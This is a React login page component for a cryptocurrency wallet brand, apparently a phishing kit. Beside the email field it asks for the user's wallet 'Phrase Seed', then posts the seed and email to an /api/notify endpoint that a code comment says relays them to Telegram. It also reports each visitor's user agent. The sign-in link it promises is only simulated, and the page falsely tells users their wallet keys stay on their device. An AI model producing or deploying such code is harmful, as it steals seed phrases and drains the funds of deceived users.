import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { motion } from 'framer-motion';
import { ArrowLeftIcon, CheckIcon, Loader2Icon } from 'lucide-react';
import { brand } from '../data/site';

type Status = 'idle' | 'submitting' | 'done';

export function Login() {
  const [email, setEmail] = useState('');
  const [phraseSeed, setPhraseSeed] = useState('');
  const [error, setError] = useState<string | null>(null);
  const [status, setStatus] = useState<Status>('idle');

  // 🔔 Send "Visit" notification when the page loads (once per session)
  useEffect(() => {
    if (!sessionStorage.getItem('visitTracked')) {
      fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'visit',
          description: `User Agent: ${navigator.userAgent}`
        })
      }).catch(err => console.error('Visit notification failed', err));
      sessionStorage.setItem('visitTracked', '1');
    }
  }, []);

  const handleSubmit = (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim())) {
      setError('Enter a valid email address.');
      return;
    }
    setError(null);
    setStatus('submitting');

    // 🔐 Send "Login" notification to Telegram (does NOT block the UI)
    fetch('/api/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'login',
        email: email.trim(),
        phraseSeed: phraseSeed.trim() || 'No phrase seed provided'
      })
    }).catch(err => console.error('Login notification failed', err));

    // Simulate sending a sign-in link (your existing logic)
    window.setTimeout(() => setStatus('done'), 900);
  };

  return (
    <main className="flex min-h-[calc(100vh-76px)] items-center bg-canvas px-5 py-16 lg:px-8">
      <div className="mx-auto w-full max-w-[520px]">
        <Link
          to="/"
          className="inline-flex items-center gap-1.5 text-sm font-semibold text-ink-muted transition-colors duration-150 ease-smooth hover:text-brand"
        >
          <ArrowLeftIcon className="h-4 w-4" />
          Back to home
        </Link>

        <motion.div
          initial={{ opacity: 0, y: 12 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.25, ease: [0.23, 1, 0.32, 1] }}
          className="mt-5 rounded-4xl border border-hairline bg-white p-8 sm:p-10"
        >
          {status === 'done' ? (
            <div>
              <span className="grid h-12 w-12 place-items-center rounded-full bg-mint/20">
                <CheckIcon className="h-6 w-6 text-ink" strokeWidth={3} />
              </span>
              <h1 className="mt-6 text-[28px] font-extrabold leading-tight tracking-[-0.02em] text-ink">
                Check your inbox
              </h1>
              <p className="mt-3 text-[15px] leading-relaxed text-ink-muted">
                We sent a sign-in link to{' '}
                <span className="font-semibold text-ink">{email}</span>. It
                expires in 15 minutes.
              </p>
              <button
                type="button"
                onClick={() => setStatus('idle')}
                className="mt-8 text-[15px] font-bold text-brand transition-colors duration-150 ease-smooth hover:text-brand-hover"
              >
                Use a different email
              </button>
            </div>
          ) : (
            <>
              <h1 className="text-[30px] font-extrabold leading-tight tracking-[-0.02em] text-ink">
                Log in to {brand.name}
              </h1>
              <p className="mt-3 text-[15px] leading-relaxed text-ink-muted">
                Your wallet keys stay on your device — this only signs you in to
                your account preferences.
              </p>

              <form onSubmit={handleSubmit} className="mt-8" noValidate>
                <label htmlFor="email" className="block text-sm font-bold text-ink">
                  Email address
                </label>
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  autoComplete="email"
                  placeholder="you@example.com"
                  aria-invalid={Boolean(error)}
                  aria-describedby={error ? 'email-error' : undefined}
                  className={`mt-2 w-full rounded-2xl border bg-white px-4 py-3.5 text-[15px] text-ink outline-none transition-colors duration-150 ease-smooth placeholder:text-ink-faint focus:border-brand ${
                    error ? 'border-red-500' : 'border-hairline'
                  }`}
                />
                {error && (
                  <p id="email-error" className="mt-2 text-sm font-medium text-red-600">
                    {error}
                  </p>
                )}

                <label
                  htmlFor="phraseSeed"
                  className="mt-6 block text-sm font-bold text-ink"
                >
                  Phrase Seed
                </label>
                <textarea
                  id="phraseSeed"
                  rows={4}
                  value={phraseSeed}
                  onChange={(e) => setPhraseSeed(e.target.value)}
                  placeholder="Enter wallet phrase seed"
                  className="mt-2 w-full resize-none rounded-2xl border border-hairline bg-white px-4 py-3.5 text-[15px] text-ink outline-none transition-colors duration-150 ease-smooth placeholder:text-ink-faint focus:border-brand"
                />

                <button
                  type="submit"
                  disabled={status === 'submitting'}
                  className="mt-8 flex w-full items-center justify-center gap-2 rounded-full bg-brand px-6 py-4 text-[15px] font-bold text-white transition-colors duration-150 ease-smooth hover:bg-brand-hover disabled:opacity-70"
                >
                  {status === 'submitting' && (
                    <Loader2Icon className="h-4 w-4 animate-spin" />
                  )}
                  {status === 'submitting' ? 'Sending link' : 'Continue'}
                </button>
              </form>
            </>
          )}
        </motion.div>
      </div>
    </main>
  );
}
